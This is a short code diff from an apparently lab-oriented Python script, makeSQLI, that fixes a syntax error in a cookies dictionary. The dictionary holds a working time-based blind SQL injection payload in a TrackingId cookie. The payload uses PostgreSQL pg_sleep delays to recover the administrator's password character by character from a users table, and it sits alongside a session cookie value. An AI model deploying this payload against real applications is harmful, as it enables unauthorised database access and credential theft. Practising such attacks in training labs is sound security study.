@@ -29,7 +29,7 @@ def makeSQLI():
   
   for position in range(1,21):
     for character in characters:
-        cookies {
+        cookies = {
           "TrackingId": f"y7MTaFfCr0QwwuQM'||(select case when substring(password,{position},1)='{character}' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')--",
           "session" : "VicnXIHZRxbIi676o6p72oFNo6wsPXXY"
         }
